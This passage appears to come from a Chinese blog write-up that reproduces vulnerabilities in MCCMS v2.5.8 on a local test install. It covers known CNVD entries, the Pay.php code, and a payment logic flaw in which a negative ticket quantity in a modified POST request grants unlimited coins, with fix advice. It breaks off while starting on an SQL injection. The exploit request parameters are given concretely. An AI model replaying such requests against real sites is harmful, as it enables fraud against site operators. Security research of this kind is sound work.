新增漫画模版</span><br><span class="line">│ │  │  │─comic_info.html 漫画详情模版</span><br><span class="line">│ │  │  │─comment.html 读者评论模版</span><br><span class="line">│ │  │  │─drawing.html 提现记录模版</span><br><span class="line">│ │  │  │─drawing_add.html 申请提现模版</span><br><span class="line">│ │  │  │─home.html 作者主页模版</span><br><span class="line">│ │  │  │─income.html 分成记录模版</span><br><span class="line">│ │  │  │─<span class="built_in">index</span>.html 作者中心主页模版</span><br><span class="line">│ │  │  │─renzheng.html 作者认证模版</span><br><span class="line">│ │  │─user 读者中心目录</span><br><span class="line">│ │  │  │─packs.html 样式模版</span><br><span class="line">│ │  │  │─head.html 模板头部文件</span><br><span class="line">│ │  │  │─bottom.html 模板底部文件</span><br><span class="line">│ │  │  │─<span class="keyword">left</span>.html 模板左部文件</span><br><span class="line">│ │  │  │─<span class="keyword">right</span>.html 模板右部文件</span><br><span class="line">│ │  │  │─<span class="built_in">index</span>.html 读者中心主页模版</span><br><span class="line">│ │  │  │─bind.html 第三方账号绑定模版</span><br><span class="line">│ │  │  │─buy.html 消费记录模版</span><br><span class="line">│ │  │  │─comic.html 漫画购买记录模版</span><br><span class="line">│ │  │  │─comment.html 评论记录模版</span><br><span class="line">│ │  │  │─fav.html 漫画收藏记录模版</span><br><span class="line">│ │  │  │─info.html 资料修改模版</span><br><span class="line">│ │  │  │─info_pass.html 密码修改模版</span><br><span class="line">│ │  │  │─message.html 消息列表模版</span><br><span class="line">│ │  │  │─order.html 充值订单记录模版</span><br><span class="line">│ │  │  │─<span class="keyword">read</span>.html 阅读记录模版</span><br><span class="line">│ │  │  │─ticket.html 月票消费记录模版</span><br><span class="line">│ │  │  │─pay.html 充值中心模版</span><br><span class="line">│ │  │  │─pay_cion.html 虚拟币充值模版</span><br><span class="line">│ │  │  │─pay_ticket.html 购买月票模版</span><br><span class="line">│ │  │  │─pay_vip.html 充值VIP模版</span><br><span class="line">│ │  │  │─<span class="keyword">reg</span>.html 用户注册模版</span><br><span class="line">│ │  │  │─login.html 用户登陆模版</span><br><span class="line">│ │  │  │─pass.html 找回密码模版</span><br><span class="line">│ │  │─packs.html 样式模版</span><br><span class="line">│ │  │─head.html 模板头部文件</span><br><span class="line">│ │  │─bottom.html 模板底部文件</span><br><span class="line">│ │  │─<span class="keyword">left</span>.html 模板左部文件</span><br><span class="line">│ │  │─<span class="keyword">right</span>.html 模板右部文件</span><br><span class="line">│ │  │─category.html 漫画检索模版</span><br><span class="line">│ │  │─chapter.html 漫画阅读模版</span><br><span class="line">│ │  │─comic.html 漫画详情模版</span><br><span class="line">│ │  │─comment.html 漫画评论模版</span><br><span class="line">│ │  │─error.html 错误提示模版</span><br><span class="line">│ │  │─<span class="built_in">index</span>.html 主页模版</span><br><span class="line">│ │  │─lists.html 分类页模版</span><br><span class="line">│ │  │─<span class="built_in">search</span>.html 漫画搜索模版</span><br><span class="line">│ ├─pic.png 模板演示图片文件</span><br><span class="line">│ ├─tpl.php 模板信息文件</span><br><span class="line">│─tempalte/[<span class="keyword">pc</span>/wap]/<span class="number">2</span>/ 模板<span class="number">2</span></span><br><span class="line">│─…</span><br><span class="line">│─template/[<span class="keyword">pc</span>/wap]/n/ 模板<span class="keyword">N</span></span><br></pre></td></tr></table></figure>

<h3 id="版本更新文档"><a href="#版本更新文档" class="headerlink" title="版本更新文档"></a>版本更新文档</h3><p>当我们在后台页面时，会弹出更新提醒，在这提醒中我们大致得到了几个已知漏洞的存在</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">当前环境mccms <span class="built_in">v2</span>.<span class="number">5</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221122212640814.png" alt="image-20221122212640814"></p>
<p><img src="/2022/11/22/SYC/image-20221122211650800.png" alt="image-20221122211650800"></p>
<p>在官方提示更新的文档中，我们得到消息</p>
<p>在当前<code>v2.5.8</code>版本中，存在至少4个漏洞</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>修复了充值月票逻辑缺陷</span><br><span class="line"><span class="number">2.</span>修复了作家发布漫画小说命令执行漏洞</span><br><span class="line"><span class="number">3.</span>修复了<span class="keyword">SQL</span>注入漏洞</span><br><span class="line"><span class="number">4.</span>修复了后台一处安全漏洞</span><br></pre></td></tr></table></figure>

<h2 id="CMS已被找到的公开漏洞信息"><a href="#CMS已被找到的公开漏洞信息" class="headerlink" title="CMS已被找到的公开漏洞信息"></a><code>CMS</code>已被找到的公开漏洞信息</h2><p><code>CNVD-2021-51411</code>【危害低】</p>
<table>
<thead>
<tr>
<th>公开时间2021-08-18</th>
<th>报送时间2021-07-06</th>
</tr>
</thead>
<tbody><tr>
<td>收录时间2021-07-16</td>
<td>更新时间2021-07-16</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<p><code>CNVD-2021-48907</code>【危害高】</p>
<table>
<thead>
<tr>
<th>公开时间2021-08-12</th>
<th>报送时间2021-06-28</th>
</tr>
</thead>
<tbody><tr>
<td>收录时间2021-07-09</td>
<td>更新时间2021-07-09</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51867</span></span><br><span class="line"></span><br><span class="line">中危 Mccms存在任意文件下载漏洞</span><br><span class="line"></span><br><span class="line">桂林崇胜网络科技有限公司 Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure>



<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51492</span></span><br><span class="line"></span><br><span class="line">中危 Mccms存在文件上传漏洞</span><br><span class="line"></span><br><span class="line">桂林崇胜网络科技有限公司 Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure>



<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51860</span></span><br><span class="line"></span><br><span class="line">中危 Mccms存在逻辑缺陷漏洞</span><br><span class="line"></span><br><span class="line">桂林崇胜网络科技有限公司 Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure>

<h2 id="批量代码审计"><a href="#批量代码审计" class="headerlink" title="批量代码审计"></a>批量代码审计</h2><p><code>Seay</code>代码审计</p>
<p><img src="/2022/11/22/SYC/image-20221122165423902.png" alt="image-20221122165423902"></p>
<p>由我们对更新文档中的信息以及目录结构猜测这些漏洞大概出现在哪些代码处</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-充值月票逻辑缺陷"><a href="#1-充值月票逻辑缺陷" class="headerlink" title="1.充值月票逻辑缺陷"></a>1.充值月票逻辑缺陷</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">充值月票逻辑缺陷</span><br><span class="line">猜测为支付漏洞</span><br><span class="line">常见大致有4种，修改单价，修改总价，修改购买数量，以及重复发包导致以少量的钱实现多次购买</span><br></pre></td></tr></table></figure>

<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>查看支付代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php </span></span><br><span class="line">  <span class="comment">//金币</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;cion&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">20</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">30</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">50</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//VIP</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;vip&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb1,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;月度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期30天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">90</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb2,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;季度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期90天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">180</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb3,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;半年VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期180天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">365</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb4,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;年度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期365天&#x27;</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//月票</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;ticket&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">5</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*上面三个数组实现了rmb，金币，月票，vip之间的兑换率*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//支付方式</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_wxpay&#x27;</span>] = Pay_Wx_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_alipay&#x27;</span>] = Pay_Ali_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_qqpay&#x27;</span>] = Pay_QQ_Mode;</span><br></pre></td></tr></table></figure>

<p>上面主要是对数据之间关系的定义，关键在下方代码中，如何让我们的恶意订单成功并入库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line"> <span class="comment">//充值订单入库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;type&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$pay</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;pay&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$rmb</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;rmb&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">    <span class="variable">$day</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;day&#x27;</span>);</span><br><span class="line">	<span class="variable">$card</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;card&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$dayarr</span> = <span class="keyword">array</span>(<span class="number">30</span>,<span class="number">90</span>,<span class="number">180</span>,<span class="number">365</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$day</span> == <span class="number">0</span>) <span class="variable">$day</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; (<span class="variable">$rmb</span> == <span class="number">0</span> || <span class="variable">$rmb</span> &gt;<span class="number">9999</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;金额错误!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; <span class="variable">$rmb</span> &lt; Pay_Rmb_Min) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;最低充值金额&#x27;</span>.Pay_Rmb_Min.<span class="string">&#x27;元&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span> &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;月票数量错误!!!&#x27;</span>);</span><br><span class="line">    <span class="comment">/*这里有个很明显的漏洞就是，对月票数的限制只有不为0，而对于&lt;0的值，很明显可以绕过*/</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;card&#x27;</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$card</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;卡密不能为空!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;vip&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$day</span>, <span class="variable">$dayarr</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;Vip时间错误!!!&#x27;</span>);</span><br><span class="line">    <span class="variable">$parr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cion&#x27;</span>,<span class="string">&#x27;wxpay&#x27;</span>,<span class="string">&#x27;alipay&#x27;</span>,<span class="string">&#x27;qqpay&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$pay</span>, <span class="variable">$parr</span>)) <span class="variable">$pay</span> = <span class="string">&#x27;cion&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>金币支付代码流程分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line">        <span class="comment">//金币支付</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pay</span> == <span class="string">&#x27;cion&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//判断金币是否不足</span></span><br><span class="line">            <span class="variable">$cion</span> = <span class="variable">$rmb</span> * Pay_Rmb_Cion;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$cion</span> &gt; <span class="variable">$user</span>[<span class="string">&#x27;cion&#x27;</span>]) <span class="title function_ invoke__">get_json</span>(Pay_Cion_Name.<span class="string">&#x27;不足，请先充值!!!&#x27;</span>);</span><br><span class="line">            <span class="comment">/*我们实现月票反向充值金币的前提绕过就算这个对金币数量是否充足的绕过</span></span><br><span class="line"><span class="comment">            $cion中rmb是默认大于Pay_Rmb_Min这个全局变量值为1，而Pay_Rmb_Cion也是默认为10</span></span><br><span class="line"><span class="comment">            而$user[&#x27;cion&#x27;]是我们自带的开始金币数</span></span><br><span class="line"><span class="comment">            其中我们能控制得参数就只有rmb，但其实还有num</span></span><br><span class="line"><span class="comment">            当我们购买1张月票数时，rmb为￥1，</span></span><br><span class="line"><span class="comment">            但当我们购买-1张月票时呢，因为rmb为真，已经通过了其判断，但是当num计算总金额时</span></span><br><span class="line"><span class="comment">            并没有对num值的逻辑性进行判断</span></span><br><span class="line"><span class="comment">            因此</span></span><br><span class="line"><span class="comment">            ==&gt;</span></span><br><span class="line"><span class="comment">            当type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion</span></span><br><span class="line"><span class="comment">            【花费rmb=1*10等价金币买月票，</span></span><br><span class="line"><span class="comment">            也就是花费100金币买10张月票】</span></span><br><span class="line"><span class="comment">            改成</span></span><br><span class="line"><span class="comment">            type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion</span></span><br><span class="line"><span class="comment">            【花费rmb=1*(-10)等价月票，</span></span><br><span class="line"><span class="comment">            也就是花费10月票买100金币</span></span><br><span class="line"><span class="comment">            相当于花-100金币，买-10张的月票</span></span><br><span class="line"><span class="comment">            （金币=金币-(-10)；月票=月票+(-10)）</span></span><br><span class="line"><span class="comment">            】</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//购买月票</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;ticket&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;ticket&#x27;</span>]+<span class="variable">$num</span>;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买月票成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;张月票&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买VIP会员成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;天Vip会员&#x27;</span>;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;vip&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断赠送天数</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="variable">$day</span>/<span class="number">30</span>) &gt; Pay_Vip_Month)&#123;</span><br><span class="line">                	<span class="variable">$sday</span> = (<span class="keyword">int</span>)((<span class="variable">$day</span>/<span class="number">30</span>) - Pay_Vip_Month);</span><br><span class="line">                	<span class="keyword">if</span>(<span class="variable">$sday</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                		<span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$sday</span>;</span><br><span class="line">                		<span class="variable">$text</span> .= <span class="string">&#x27;，系统赠送您&#x27;</span>.<span class="variable">$sday</span>.<span class="string">&#x27;天&#x27;</span>;</span><br><span class="line">                	&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>先给我的账户修改一下金币数</p>
<p><img src="/2022/11/22/SYC/image-20221124135152005.png" alt="image-20221124135152005"></p>
<p>然后购买月票抓包看看数据</p>
<p><img src="/2022/11/22/SYC/image-20221124135229059.png" alt="image-20221124135229059"></p>
<p><img src="/2022/11/22/SYC/image-20221124135257569.png" alt="image-20221124135257569"></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="attr">type</span><span class="operator">=</span>ticket<span class="variable">&amp;rmb</span>=<span class="number">1</span><span class="variable">&amp;day</span>=<span class="number">30</span><span class="variable">&amp;num</span>=<span class="number">1</span><span class="variable">&amp;pay</span>=cion</span><br><span class="line"><span class="meta">#可以看到我们的购买数据完全显示出来</span></span><br><span class="line"><span class="meta">#type:购买的商品类型</span></span><br><span class="line"><span class="symbol"> rmb:</span>花费金额</span><br><span class="line"><span class="symbol"> day:</span>购买物品时限</span><br><span class="line"><span class="symbol"> num:</span>购买数量</span><br><span class="line"><span class="symbol"> pay:</span>支付方式</span><br></pre></td></tr></table></figure>

<p>先试试修改一下购买数量</p>
<p>【金币<code>10000</code>，购买<code>1</code>张月票花<code>10</code>金币，应该还剩<code>9990</code>】</p>
<p><img src="/2022/11/22/SYC/image-20221124141049742.png" alt="image-20221124141049742"></p>
<p>【金币<code>10000</code>，购买<code>10</code>张月票花<code>100</code>金币，应该还剩<code>9900</code>】</p>
<p><img src="/2022/11/22/SYC/image-20221124141119999.png" alt="image-20221124141119999"></p>
<p>然后我们再看看我们的剩余金额</p>
<p><img src="/2022/11/22/SYC/image-20221124141240128.png" alt="image-20221124141240128"></p>
<p>发现扣了<code>200</code>金币（应该是不小心发了两次包）</p>
<p>【还剩<code>9800</code>】</p>
<p>虽然没有实现我们的目的，既然在我们金额能承受范围内可以，那么试试超过我们金额以外的呢</p>
<p><img src="/2022/11/22/SYC/image-20221124141731975.png" alt="image-20221124141731975"></p>
<p><img src="/2022/11/22/SYC/image-20221124141845487.png" alt="image-20221124141845487"></p>
<p>发现显示金币不够，既然正常的数据不行，那么我们把数量改成负数呢</p>
<p><img src="/2022/11/22/SYC/image-20221124141931064.png" alt="image-20221124141931064"></p>
<p><img src="/2022/11/22/SYC/image-20221124141937935.png" alt="image-20221124141937935"></p>
<p>居然购买成功？</p>
<p><img src="/2022/11/22/SYC/image-20221124142002433.png" alt="image-20221124142002433"></p>
<p>我们发现我们的月票数减少了，但是金币数增加了，而且月票数为负数，明显是有问题的</p>
<p>在购买记录中，我们发下确实也有记录</p>
<p><img src="/2022/11/22/SYC/image-20221124142151770.png" alt="image-20221124142151770"></p>
<p>而获取金币的方式本来应该是通过<code>rmb</code>支付</p>
<p><img src="/2022/11/22/SYC/image-20221124142246178.png" alt="image-20221124142246178"></p>
<p>但是这里通过简单的修改月票数为负数，即可反向增加金币数量，且没有上限制</p>
<p>这里我又把<code>type</code>和<code>pay</code>两者交换</p>
<p><img src="/2022/11/22/SYC/image-20221124142618960.png" alt="image-20221124142618960"></p>
<p><img src="/2022/11/22/SYC/image-20221124142629873.png" alt="image-20221124142629873"></p>
<p>发现依旧购买成功，还显示购买<code>10</code>金币，但是月票数并没有变化，而金币却减少了，应该是月票转金币不符合逻辑，但是发的请求包中的语句符合充值语句，于是按照语法，扣除了<code>num</code>数量的金币</p>
<p><img src="/2022/11/22/SYC/image-20221124142651295.png" alt="image-20221124142651295"></p>
<p>当我又改成且修改<code>rmb</code>改成<code>1000</code></p>
<p><img src="/2022/11/22/SYC/image-20221124150939398.png" alt="image-20221124150939398"></p>
<p><img src="/2022/11/22/SYC/image-20221124151113186.png" alt="image-20221124151113186"></p>
<p>在交易记录中显示增加了<code>10000</code>金币，但是实际金币是在减少</p>
<p><img src="/2022/11/22/SYC/image-20221124151205737.png" alt="image-20221124151205737"></p>
<p>这是因为不符合充值逻辑</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">危害</span><br><span class="line">通过该漏洞，即可导致金币、月票、vip三者可以无限制</span><br></pre></td></tr></table></figure>

<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">该漏洞的形成的根本原因在于</span><br><span class="line">在sys<span class="regexp">/apps/</span>controllers<span class="regexp">/api/</span>Pay.php中</span><br><span class="line"><span class="number">1</span>.对客户端用户可控参数的限制不牢，考虑不全，</span><br><span class="line"><span class="number">2</span>.对于负数的清况，</span><br><span class="line"><span class="number">3</span>.以及对不合逻辑的支付方式的判断不够</span><br><span class="line"></span><br><span class="line">建议</span><br><span class="line"><span class="number">1</span>.对客户端可控参数进行加密，让用户无法修改其值</span><br><span class="line"><span class="number">2</span>.并且对参数的合理性以及逻辑性加强判断，完善整体代码逻辑，加强不同参数之间的联系，以及参数变化前后的逻辑性</span><br><span class="line"><span class="number">3</span>.最好不要让用户能对发送到服务器的数据进行修改或控制</span><br></pre></td></tr></table></figure>

<h3 id="2-SQL注入漏洞"><a href="#2-SQL注入漏洞" class="headerlink" title="2.SQL注入漏洞"></a>2.SQL注入漏洞</h3><h4 id="代码分析-漏洞利用"><a href="#代码分析-漏洞利用" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><p>这里利用了<code>Acunetix</code>对站点扫描，发现了在主页存在高危的<code>SQL</code>漏洞</p>
<p><img src="/2022/11/22/SYC/image-20221126214707108.png" alt="image-20221126214707108"></p>
<p>发请求包，后发现其响应包的结果为数据库报错</p>
<p><img src="/2022/11/22/SYC/image-20221126214959756.png" alt="image-20221126214959756"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Database Error Occurred<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Error Number: 1064</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc</span><br><span class="line">              #发现1&#x27;被插入in()中</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Line Number: 38</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是尝试再<code>in()</code>中能否实现闭合并执行恶意<code>sql</code>语句</p>
<p>但是在源码中对sql语句有一定过滤</p>
